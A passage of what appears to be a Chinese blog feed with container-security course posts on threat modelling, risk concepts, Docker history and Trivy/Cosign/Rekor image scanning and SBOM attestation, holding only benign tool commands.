课：容器镜像》</strong> 中将讨论的话题。</p><h3 id="2-5-不良配置的容器"><a href="#2-5-不良配置的容器" class="headerlink" title="2.5 不良配置的容器"></a>2.5 不良配置的容器</h3><p>正如前面所说，我们可能会赋予容器一些不必要的、没有经过规划的权限。这部分内容我们将在 <strong>《第 9 课：打破容器之间的隔离》</strong> 进行详细说明。</p><p>友情提示：若您从互联网中下载了一些 YAML 配置文件，例如 <code>docker-compose.yaml</code>，在使用之前请确保：这些配置文件没有包含一些不必要的权限与配置。</p><h3 id="2-6-有漏洞的宿主机"><a href="#2-6-有漏洞的宿主机" class="headerlink" title="2.6 有漏洞的宿主机"></a>2.6 有漏洞的宿主机</h3><p>容器最终是要在宿主机上运行的，所以您还需确保这些<strong>宿主机没有运行着易受攻击的应用程序和组件</strong>，例如：一些包含着已知漏洞的旧版本的编程组件。</p><p>最好的方法是：<strong>尽量减少安装在宿主机上的软件数量</strong>以减少攻击面，并且还需要<strong>根据最佳安全实践来对宿主机进行正确的配置</strong>。</p><p>这部分内容，我们将在 <strong>《第 4 课：容器之间的隔离》</strong> 进行深入讲解。</p><h3 id="2-7-暴露的-secret"><a href="#2-7-暴露的-secret" class="headerlink" title="2.7 暴露的 secret"></a>2.7 暴露的 secret</h3><p>应用程序代码通常需要凭证、令牌（即 token）或者是密码才能够与系统中的其他组件进行通信。</p><p>若对应用程序进行容器化，您还需要<strong>将这些敏感数据作为 secret 的值传递到容器中</strong>。</p><p>传递 secret 的方式有哪些呢？这些我们将在 <strong>《第 12 课：传递 secret 到容器中》</strong> 中进行讲解，并分析各种方法的安全性。</p><h3 id="2-8-不安全的网络"><a href="#2-8-不安全的网络" class="headerlink" title="2.8 不安全的网络"></a>2.8 不安全的网络</h3><p>容器通常要与其他容器进行通信，或者需要与外部环境进行通信，我们将在 <strong>《第 10 课：容器网络安全》</strong> 中讨论容器的各种网络连接方式。</p><p>然后在 <strong>《第 11 课：使用 TLS 在组件之间建立起安全的连接》</strong> 中讲解如何在组件之间建立起安全的连接。</p><h3 id="2-9-容器逃逸漏洞"><a href="#2-9-容器逃逸漏洞" class="headerlink" title="2.9 容器逃逸漏洞"></a>2.9 容器逃逸漏洞</h3><p>像 containerd 和 CRI-O 这些容器运行时已经相当经得起实战的考验并被广泛地使用了。但它们仍然可能存在着一些未被发现的漏洞，这些漏洞可能会导致运行在容器中的恶意代码逃逸到宿主机上。</p><p>2019 年，波兰的安全研究员 Adam Iwaniuk 和 Borys Popławski 在参加完 CTF 竞赛过后，便萌生了“<strong>研究基于 Namespace 的沙箱逃逸的方法</strong>”的想法，此后便发现了著名的<a href="https://access.redhat.com/security/vulnerabilities/runcescape" title="CVE-2019-5736">CVE-2019-5736</a>漏洞，该漏洞也被称为 Runcescape，博客<a href="https://thenewstack.io/what-you-need-to-know-about-the-runc-container-escape-vulnerability/" title="What You Need to Know About the RunC Container Escape Vulnerability">What You Need to Know About the RunC Container Escape Vulnerability</a>对该漏洞进行了很好的总结，有兴趣的读者可以自行查看。</p><p><img src="/image/image_XtAjtRCv4v.png" alt="图 3：RedHat 关于 CVE-2019-5736（Runcescape）漏洞的介绍" title="图3：RedHat关于CVE-2019-5736（Runcescape）漏洞的介绍"></p><p>你将在 <strong>《第 4 课：容器之间的隔离》</strong> 中了解到一些可以限制容器内的应用程序的行为的隔离机制。</p><p>对于一些核心的应用程序而言，容器逃逸的后果会非常严重，所以您需要考虑更加强大的容器隔离机制，详情请看 <strong>《第 8 章：加强容器之间的隔离》</strong>。</p><h2 id="0x03-拓展阅读"><a href="#0x03-拓展阅读" class="headerlink" title="0x03 拓展阅读"></a>0x03 拓展阅读</h2><p>其他的攻击向量超出了本次课程所涵盖的范围，但是我们不得不简要地提示一下：</p><ol><li>应用程序的源代码通常会存储在代码仓库中，理论上来说这些代码仓库也有可能会遭到攻击，进而导致应用程序会被破坏。因此，您需要确保用户对代码仓库进行访问控制的权限得到了适当地管理。</li><li>宿主机之间通常通过网络进行连接，并且使用 VPC 来确保安全性，然后再连接到互联网中。在传统的部署环境中，您需要安全的网络配置、防火墙以及身份访问管理系统来确保宿主机（或虚拟机）不被攻击者所访问，这些在云原生环境中仍然适用。</li><li>容器通常在一些编排工具中运行，例如 Kubernetes、Docker Swarm 或 Hashicorp Nomad。如果这些编排工具的配置是不安全的，那么其访问控制没有得到有效地管理，这也会给攻击者提供额外的攻击路径，从而影响到部署环境的安全性。</li></ol><p>此外，如果您对 Kubernetes 部署环境中的威胁模型感兴趣。可以阅读以下资料：</p><ul><li>CNCF 的<a href="https://web.archive.org/web/20190812032049/https://github.com/kubernetes/community/blob/master/wg-security-audit/findings/Kubernetes%20Threat%20Model.pdf" title="Kubernetes Threat Model">Kubernetes Threat Model</a></li><li>CNCF 的金融用户组发布的基于<a href="https://en.wikipedia.org/wiki/STRIDE_model" title="STRIDE">STRIDE</a>方法创建的<a href="https://github.com/cncf/financial-user-group/tree/main/projects/k8s-threat-model" title="Kubernetes攻击树">Kubernetes 攻击树</a></li></ul><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文，我们分享了对环境进行威胁建模的统一的方法和思路，即：考虑环境的参与者是谁？他们可能具备的权限合集有哪些。然后，我们基于容器的生命周期的各个阶段所潜在的攻击向量，对容器进行了威胁建模。此外，我们还提供了许多拓展阅读的资料，方便读者自行学习。</p><p>很多云原生安全爱好者在第一次学习云原生安全的时候，要么一头扎进技术细节中，以至于“管中窥豹，可见一斑”；要么沉迷于各种防护理论体系，最终无法将方案落地。</p><p>掌握技术实现的基础原理，同时又有一个全局的防护观对于学习云原生安全而言至关重要。接下来，我们将根据这个容器威胁模型一层层剖析容器防护的基础技术与原理。</p><p>本文干货多多，建议收藏～</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>1.1 风险、威胁和缓解措施</title>
    <link href="/2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/"/>
    <url>/2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>风险与威胁有什么区别？缓解措施和它们又有什么关系呢？在对容器进行威胁建模之前，我们先简单说明一下风险、威胁及缓解措施的基本概念。</p><h2 id="0x01-定义"><a href="#0x01-定义" class="headerlink" title="0x01 定义"></a>0x01 定义</h2><p>首先，我们来看一下定义：</p><ul><li>风险（Risk）：潜在的问题，以及如果问题发生会造成的影响。</li><li>威胁（Threat）：导致风险发生的途径。</li><li>缓解措施（Mitigation）：对威胁的应对措施，即：你可以采取的可以用来防止威胁或至少降低其成功的可能性。</li></ul><p><img src="/image/image_bNAqfZU-KV.png" alt="图 1：风险、威胁和缓解措施之间的关系" title="图1：风险、威胁和缓解措施之间的关系"></p><p>假设一个情景：<strong>有人从你家偷走了车钥匙</strong>。那么：</p><ul><li>风险（Risk）：你的车可能会被开走。</li><li>威胁（Threat）：偷取钥匙的不同的方式，例如：打破窗户伸手拿；用鱼竿将它钓走；敲门分散你的注意力，同时帮凶迅速溜进家中拿走钥匙。</li><li>缓解措施（Mitigation）：让车钥匙不要离开你的视线。</li></ul><p><img src="/image/image_kxpNkk_vNI.png" alt="图 2：若车钥匙被偷走了，其风险、威胁和缓解措施所对应的事项" title="图2：若车钥匙被偷走了，其风险、威胁和缓解措施所对应的事项"></p><h2 id="0x02-风险之间的差异"><a href="#0x02-风险之间的差异" class="headerlink" title="0x02 风险之间的差异"></a>0x02 风险之间的差异</h2><p><strong>风险因组织而异</strong>：</p><ul><li>对于银行而言，风险是资金被盗取；</li><li>对于电商而言，风险是交期被欺诈；</li><li>对于经营博客的个人开发者而言，风险是别人入侵他们的网站并且发布不当言论。</li></ul><p><strong>风险不仅因国家之间的隐私法规不同而不同，还因地理位置不同而不同</strong>：</p><ul><li>在许多国家，泄露客户个人数据仅会损害声誉，</li><li>而在欧洲，<a href="https://www.atlassian.com/zh/trust/compliance/resources/gdpr" title="通用数据保护条例（General Data Protection Regulation ，GDPR）"><strong>通用数据保护条例（General Data Protection Regulation，GDPR）</strong></a><a href="https://www.atlassian.com/zh/trust/compliance/resources/gdpr" title="允许的罚款高达公司总收入的4%">允许的罚款高达公司总收入的 4%</a>。</li></ul><p><img src="/image/image_DktmbcMTiw.png" alt="图 3：维基百科上对于 通用数据保护条例 的介绍" title="图3：维基百科上对于 通用数据保护条例 的介绍"></p><p>2019 年 7 月，CSO 统计了因数据泄漏或不遵守安全法而处以的最高罚款的事件，截止至 2024 年 4 月 26 日共有 15 起，这份<a href="https://www.csoonline.com/article/567531/the-biggest-data-breach-fines-penalties-and-settlements-so-far.html" title="名单">名单</a>会随着相关处罚的新闻出现而持续更新。</p><table><thead><tr><th>序号</th><th>公司</th><th>金额</th></tr></thead><tbody><tr><td>1</td><td>Meta（Facebook）</td><td>13 亿美元</td></tr><tr><td>2</td><td>滴滴</td><td>11.9 亿美元</td></tr><tr><td>3</td><td>Amazon</td><td>8.77 亿美元</td></tr><tr><td>4</td><td>Equifax</td><td>5.75 亿美元（至少）</td></tr><tr><td>5</td><td>Meta（Facebook、Instagram）</td><td>4.13 亿美元</td></tr><tr><td>6</td><td>Instagram</td><td>4.03 亿美元</td></tr><tr><td>7</td><td>TikTok</td><td>3.7 亿美元</td></tr><tr><td>8</td><td>T-Mobile</td><td>3.5 亿美元</td></tr><tr><td>9</td><td>Meta（Facebook）</td><td>2.77 亿美元</td></tr><tr><td>10</td><td>WhatsApp</td><td>2.55 亿美元</td></tr><tr><td>11</td><td>Home Depot</td><td>约 2 亿美元</td></tr><tr><td>12</td><td>Capital One</td><td>1.9 亿美元</td></tr><tr><td>13</td><td>Uber</td><td>1.48 亿美元</td></tr><tr><td>14</td><td>Morgan Stanley</td><td>1.2 亿美元（总计）</td></tr><tr><td>15</td><td>Google Ireland</td><td>1.02 亿美元</td></tr></tbody></table><h2 id="0x03-风险管理系统"><a href="#0x03-风险管理系统" class="headerlink" title="0x03 风险管理系统"></a>0x03 风险管理系统</h2><p>也正因为风险之间存在着较大的差异，所以不同的威胁的相对重要程度会有所不同，进而导致缓解措施也不同。<strong>为了提供一个系统的思考风险的过程，风险管理框架（risk management framework，RMF）应运而生</strong>，它能列举出各种威胁、确定风险的重要性并定义缓解措施。</p><h2 id="0x04-威胁模型"><a href="#0x04-威胁模型" class="headerlink" title="0x04 威胁模型"></a>0x04 威胁模型</h2><p>由于威胁是风险发生的途径，如何识别并列举出系统潜在的威胁至关重要。<strong>威胁模型（Threat modeling）可以系统地查看系统组件和可能的攻击模式，以帮助您确定系统最容易受到攻击的位置。</strong></p><p>需要注意的是，没有单一的综合的威胁模型，因为威胁模型还取决于风险、特定环境、组织和正在运行的应用程序等种种因素。虽然容器的威胁模型不能列出全部的威胁，但它可以列出大多数容器部署环境所存在的一些共同的潜在威胁。</p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文，我们通过情景再现，解释了风险、威胁和缓解措施的概念，并且浏览了全球 Top 15 因数据泄露或不遵守安全和隐私法而处以的最高罚款和罚金的事件。</p><p>为了提供一个系统的思考风险和识别威胁的过程，我们简单介绍了风险管理框架和威胁模型的定义。</p><p>需要注意的是，虽然没有一个综合的威胁模型，但为了识别出容器部署环境所存在的威胁，对容器进行威胁建模仍然是一个有效的方式。</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第 1 课 容器安全威胁建模</title>
    <link href="/2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/"/>
    <url>/2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这些年来，随着容器的使用率大幅度增长，很多人将 Docker 和容器简单地画上了等号，但早在 Docker 崛起之前，容器的概念就已经存在了很多年……</p><h2 id="0x01-Docker-问世让容器再次“翻红”"><a href="#0x01-Docker-问世让容器再次“翻红”" class="headerlink" title="0x01 Docker 问世让容器再次“翻红”"></a>0x01 Docker 问世让容器再次“翻红”</h2><p>2013 年 3 月 15 日，<a href="https://pyvideo.org/pycon-us-2013/the-future-of-linux-containers.html" title="Docker 的创始人Solomon Hykes在 PyCon 上首次向全世界公开展示了 Docker">Docker 的创始人 Solomon Hykes 在 PyCon 上首次向全世界公开展示了 Docker</a>。他指出了，对于开发人员来说，将应用程序部署到服务器上非常困难，因此他和他的早期团队设计了 Docker，以帮助开发者更方便地在任何地方构建、共享和运行应用程序。</p><p><img src="/image/image_LQiX5rts5g.png" alt="图 1：Docker 的创始人 Solomon Hykes 在 PyCon 上首次向全世界公开展示了 Docker" title="图 1 ：Docker 的创始人Solomon Hykes在 PyCon 上首次向全世界公开展示了 Docker"></p><p>正如 Docker 最初的标语“一处构建，处处运行”所说的那样，容器可以将应用程序及其依赖等一切所需要的东西都打包到容器中，然后将容器和宿主机的其他部分隔离开来。这一来，我们就可以在各自的个人电脑或者服务器上运行着相同的应用程序的镜像了。Docker 这种简单易用的命令行工具的问世导致容器再次“翻红”，在开发者社区中迅速风靡起来了。</p><p>Kubernetes 社区资深成员与项目维护者张磊在他的书《<a href="https://book.douban.com/subject/35424872/" title="深入剖析 Kubernetes">深入剖析 Kubernetes</a>》中说道：“<strong>Docker 项目给 PaaS 世界带来的‘降维打击’，其实是提供了一种非常便利的打包机制。这种机制直接打包了应用运行所需要的整个操作系统，从而保证了本地环境和云端环境的高度一致，避免了用户通过‘试错’来匹配两种不同运行环境之间差异的痛苦过程。</strong>”</p><p><img src="/image/image_p2hPemXzhW.png" alt="图 2：豆瓣读书中的《深入剖析 Kubernetes》介绍" title="图 2 ：豆瓣读书中的《深入剖析 Kubernetes》介绍"></p><h2 id="0x02-容器解决了应用程序的依赖问题"><a href="#0x02-容器解决了应用程序的依赖问题" class="headerlink" title="0x02 容器解决了应用程序的依赖问题"></a>0x02 容器解决了应用程序的依赖问题</h2><p>在容器出现之前，你很容易会陷入依赖关系的噩梦中去，即：<strong>同一主机上的两个应用程序需要依赖相同的软件包的不同版本</strong>。要解决这个问题其实很简单，你只要将应用程序部署到不同的主机上就可以了，但这样未免会造成资源的浪费。</p><p>但只要有了容器，你可以用更加高效的方案来解决这个问题，那就是：将应用程序容器化，部署到同一宿主机的不同容器中。容器的隔离机制可以让依赖关系彼此隔离，即：<strong>你在同一宿主机上同时运行多个不同的容器而不受干扰</strong>。</p><h2 id="0x03-容器编排改变了应用程序的部署方式"><a href="#0x03-容器编排改变了应用程序的部署方式" class="headerlink" title="0x03 容器编排改变了应用程序的部署方式"></a>0x03 容器编排改变了应用程序的部署方式</h2><p>“容器就从一个开发者手里的小工具，一跃成为了云计算领域的绝对主角；而能够定义容器组织和管理规范的‘容器编排’技术，则当仁不让地坐上了容器技术领域的‘头把交椅’。”</p><p><strong>像 Kubernetes 这样的容器编排工具完美解决了：如何自动化地将容器部署到服务器集群中。</strong> 你只需告诉编排工具，你想要运行哪些容器，它就会为每一个容器找到一个非常合适的位置，而无须你手动地在特定的主机中安装应用程序了。</p><p><img src="/image/image_N3Cq7QGOs5.png" alt="图 3：CI&#x2F;CD with Git, Jenkins, Ansible, Docker, Kubernetes on AWS" title="图3：CI&#x2F;CD with Git, Jenkins, Ansible, Docker, Kubernetes on AWS"></p><h2 id="0x04-安全研究员的思考"><a href="#0x04-安全研究员的思考" class="headerlink" title="0x04 安全研究员的思考"></a>0x04 安全研究员的思考</h2><p>容器和容器编排的出现彻底改变了开发者的开发流程，但作为安全人员，我们该如何看待这个科技的浪潮呢？</p><p>从安全的角度上来讲，容器的部署环境和传统的部署环境所面临风险情况相同。例如，数据窃取、修改系统行为和挖矿（使用他人的计算资源来挖掘自己的加密货币）等等。</p><p>虽然这些在容器化的环境中并不会有什么改变，但容器确确实实地改变了应用程序的许多方面的状况，因此还产生了一套不同的风险机制。</p><p>接下来，我们从以下 5 个方面来总览容器所面临的风险，以及如何对容器进行威胁建模：</p><ol><li><a href="../../../../2024/06/11/1-1-%E9%A3%8E%E9%99%A9%E3%80%81%E5%A8%81%E8%83%81%E5%92%8C%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD/index.html">《1.1 风险、威胁和缓解措施》</a></li><li><a href="../../../../2024/06/12/1-2-%E5%AE%B9%E5%99%A8%E5%A8%81%E8%83%81%E6%A8%A1%E5%9E%8B/">《1.2 容器威胁模型》</a></li><li><a href="../../../../2024/06/13/1-3-%E5%AE%89%E5%85%A8%E8%BE%B9%E7%95%8C/">《1.3 安全边界》</a></li><li><a href="../../../../2024/06/17/1-4-%E5%A4%9A%E7%A7%9F%E6%88%B7/">《1.4 多租户》</a></li><li><a href="../../../../2024/06/07/%E7%AC%AC-1-%E8%AF%BE-%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8%E5%A8%81%E8%83%81%E5%BB%BA%E6%A8%A1/">《1.5 安全原则》</a></li></ol><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>本文，我们简述了 Docker 基于容器的概念，为开发者解决了应用程序的依赖关系的问题，提供了一种便捷的打包机制，从而在开发者社区中爆火。</p><p>不久后，容器编排改变了应用程序的部署方式，当仁不让地坐上了容器技术领域的“头把交椅”。</p><p>从安全的角度看待这次变革，我们需要思考容器部署环境与传统部署环境所面临的风险点有哪些异同点，以及如何建立一个适用于容器环境的威胁模型。</p><p>接下来，我们从一个较高的层次来总览容器所面临的风险，以便建立起一个全局的防护观。</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小猫咪都能听得懂的镜像扫描原理（二）</title>
    <link href="/2024/05/27/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2024/05/27/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>正如上一篇文章所说的，不仅系统软件包层面有漏洞风险，应用程序层面也有漏洞风险。</p><p>很多应用程序都会使用特定的语言包管理器安装所需要安装的第三方库，例如 Node.js 的 npm、Python 的 pip 以及 Java 的 Maven 等等。使用这些工具安装的第三方依赖库也可能会成为潜在的漏洞源。</p><h2 id="0x01-应用程序级漏洞"><a href="#0x01-应用程序级漏洞" class="headerlink" title="0x01 应用程序级漏洞"></a>0x01 应用程序级漏洞</h2><p>我们在使用 Go、C 或者 Rust 之类的编程语言的时候，<strong>既可以将第三方依赖安装为共享库，也可以在构建的时候链接到二进制文件中去</strong>。</p><p>若二进制文件已经链接了依赖，不依靠外部环境，那么我们可以称之为独立可执行文件，即 standalone。standalone 在容器化时，可以选择<a href="https://hub.docker.com/_/scratch" title="scratch">scratch</a>作为基础镜像。</p><p>scratch 镜像非常特殊，它不包含操作系统、库和其他任何预装软件，非常小、非常精简，是一个空的、没有任何内容的镜像。</p><p><img src="/image/image_-13kFOgdzy.png" alt="图 1：scratch 镜像" title="图1：scratch 镜像"></p><p>这样做，一定程度上缓解了系统软件包层面的漏洞风险，但如果我们不知道应用程序中有哪些依赖，我们就无法扫描出其中的软件漏洞了。</p><h2 id="0x02-对容器中的应用程序漏洞进行扫描"><a href="#0x02-对容器中的应用程序漏洞进行扫描" class="headerlink" title="0x02 对容器中的应用程序漏洞进行扫描"></a>0x02 对容器中的应用程序漏洞进行扫描</h2><h3 id="2-1-已知应用程序的依赖时"><a href="#2-1-已知应用程序的依赖时" class="headerlink" title="2.1 已知应用程序的依赖时"></a>2.1 已知应用程序的依赖时</h3><p>默认情况下，Golang 编译器会将依赖信息嵌入到二进制文件中。若我们使用容器镜像扫描器<a href="https://github.com/aquasecurity/trivy" title="Trivy">Trivy</a>进行扫描，就可以<strong>提取出二进制文件中的依赖信息并进行漏洞分析</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image  --scanners vuln  --vuln-type library vulhub/grafana:8.2.6<br></code></pre></td></tr></table></figure><p><img src="/image/image_Yyf2-Lun9d.png" alt="图 2：使用 trivy 扫描镜像 vulhub&#x2F;grafana:8.2.6 中的应用程序级漏洞" title="图2：使用 trivy 扫描镜像 vulhub&#x2F;grafana:8.2.6 中的应用程序级漏洞"></p><h3 id="2-2-不知应用程序的依赖时"><a href="#2-2-不知应用程序的依赖时" class="headerlink" title="2.2 不知应用程序的依赖时"></a>2.2 不知应用程序的依赖时</h3><p>但 Java 和 Rust 应用程序却没有将依赖项加载到二进制文件中，这样我们就不知道有哪些依赖了。</p><p>大多数安全扫描器都是通过寻找应用程序中的依赖来发现漏洞的，所以若要解决这个问题，关键在于<strong>如何将依赖信息与二进制文件进行关联。</strong></p><p>接下来，我们来介绍一个 Trivy 提出来的较为前沿的解决方案，不过我们先简单了解一下 SBOM、Cosign 和 Rekor 的基本概念和应用。</p><h4 id="2-2-1-SBOM"><a href="#2-2-1-SBOM" class="headerlink" title="2.2.1 SBOM"></a>2.2.1 SBOM</h4><p><a href="https://www.cisa.gov/sbom" title="SBOM">SBOM</a>（Software Bill of Materials，软件物料清单）是一份记录软件组件及其依赖项的详细清单，用于提高软件供应链的透明度和安全性。</p><p><img src="/image/image_kQaGWksvLT.png" alt="图 3：SBOM 的官方介绍" title="图3：SBOM 的官方介绍"></p><p>Trivy 可以对容器镜像进行扫描，并生成一份 SBOM 以供其他扫描器进行安全扫描。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cyclonedx --output result.cdx alpine:3.15<br></code></pre></td></tr></table></figure><p><img src="/image/image_IZqVr4pa48.png" alt="图 4：使用 Trivy 对 alpine:3.15 镜像进行扫描，并生成 SBOM" title="图4：使用 Trivy 对 alpine:3.15 镜像进行扫描，并生成 SBOM"></p><h4 id="2-2-2-Cosign"><a href="#2-2-2-Cosign" class="headerlink" title="2.2.2 Cosign"></a>2.2.2 Cosign</h4><p><a href="https://github.com/sigstore/cosign" title="Cosign">Cosign</a> 是一个由 Sigstore 提供的工具，用于对容器镜像进行签名和验证，以增强供应链安全 Cosign 可以使用本地密钥进行签名，也可以通过 OpenID Connect 协议进行身份验证，从而实现无需密钥的签名。</p><ul><li><p><strong>使用本地密钥进行签名</strong></p><ol><li><p>首先，需要运行以下命令将生成一对公钥和密钥，更多信息请阅读<a href="https://docs.sigstore.dev/key_management/overview/" title="cosign的官网中关于密钥管理部分">cosign 的官网中关于密钥管理部分</a>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign generate-key-pair<br></code></pre></td></tr></table></figure></li><li><p>然后，我们可以使用 Trivy 生成一个 Cosign 漏洞扫描记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cosign-vuln --output vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>最后，使用 cosign 生成的密钥对漏洞扫描记录进行签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign attest --key /path/to/cosign.key --<span class="hljs-built_in">type</span> vuln --predicate vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>此外，可以验证镜像上的漏洞扫描签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign verify-attestation --key /path/to/cosign.pub --<span class="hljs-built_in">type</span> vuln &lt;IMAGE&gt;<br><br></code></pre></td></tr></table></figure></li></ol></li><li><p><strong>使用无密钥进行签名</strong></p><ol><li><p>首先，我们可以使用 Trivy 生成一个 Cosign 漏洞扫描记录。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --format cosign-vuln --output vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>然后，我们通过 OpenID Connect 协议进行身份验证，支持此协议的应用有 Google、GitHub 和 Microsoft 等等。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign attest --<span class="hljs-built_in">type</span> vuln --predicate vuln.json &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li><li><p>当然，我们也可以验证镜像上的漏洞扫描签名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cosign verify-attestation --certificate=path-to-the-certificate --<span class="hljs-built_in">type</span> vuln --certificate-identity Email-used-to-sign  --certificate-oidc-issuer=<span class="hljs-string">&#x27;the-issuer-used&#x27;</span> &lt;IMAGE&gt;<br></code></pre></td></tr></table></figure></li></ol></li></ul><h4 id="2-2-2-Rekor"><a href="#2-2-2-Rekor" class="headerlink" title="2.2.2  Rekor"></a>2.2.2  Rekor</h4><p><a href="https://github.com/sigstore/rekor" title="Rekor">Rekor</a> 是<a href="https://www.sigstore.dev/" title="Sigstore">Sigstore</a> 开发的一个公共的、不可变的签名元数据透明日志。Rekor 可以作为一个权威机构，对软件中更改的元数据进行验证并签名。</p><p>为了跟踪和验证软件中的更改部分，我们可以将签过名的元数据发送并存储在 Rekor 中，这样每个有权访问日志数据的人都可以验证资源和实体发生了哪些更改以及谁授权了这些更改。</p><p><img src="/image/image_6TpT6FrO0J.png" alt="图 5：Rekor 的 Github 项目主页" title="图5：Rekor的Github 项目主页"></p><p>由于 Rekor 提供了不可变的记录，数据一旦存储就无法更改了，所以我们可以将数据发送到公共的 Rekor 实例中，也可以在组织内部自己启动一个 Rekor 实例，这对于跨团队的更改验证非常有效。但请注意，Sigstore 团队维护的 Rekor 公共实例限制了证明的大小。如果您使用公共的实例，需确保 SBOM 足够小，详情请阅读 Rekor 的<a href="https://github.com/sigstore/rekor" title="官方文档">官方文档</a>。</p><h4 id="2-2-3-案例：bat"><a href="#2-2-3-案例：bat" class="headerlink" title="2.2.3 案例：bat"></a>2.2.3 案例：bat</h4><p>接下来，我们以 Rust 应用程序<a href="https://github.com/sharkdp/bat" title="bat">bat</a>作为示例进行说明。<code>bat</code>是从<code>cat</code>克隆出来的，但有语法高亮和其他的许多高级功能。</p><ol><li><p>我们先将<code>bat</code>的代码仓库拉下来，并使用 trivy 对其代码仓库进行扫描并生成 SBOM 文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> -b v0.20.0 https://github.com/sharkdp/bat  <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy fs --format cyclonedx --output bat.cdx ./bat/Cargo.lock<br></code></pre></td></tr></table></figure></li><li><p>准备一个 <code>bat</code> 二进制文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/sharkdp/bat/releases/download/v0.20.0/bat-v0.20.0-x86_64-apple-darwin.tar.gz<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tar xvf bat-v0.20.0-x86_64-apple-darwin.tar.gz<br></code></pre></td></tr></table></figure></li><li><p>Cosign 目前不支持 blob 认证的无密钥签名，因此需要先下载 Trivy 的插件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy plugin install github.com/aquasecurity/trivy-plugin-attest<br></code></pre></td></tr></table></figure></li><li><p>将 SBOM 证明链接到<code>bat</code>Rekor 实例中的二进制文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy attest --predicate ./bat.cdx --<span class="hljs-built_in">type</span> cyclonedx ./bat-v0.20.0-x86_64-apple-darwin/bat<br></code></pre></td></tr></table></figure></li><li><p>Trivy 会计算<code>bat</code>二进制文件的摘要，并在 Rekor 中搜索摘要中的 SBOM 证明。如果找到，Trivy 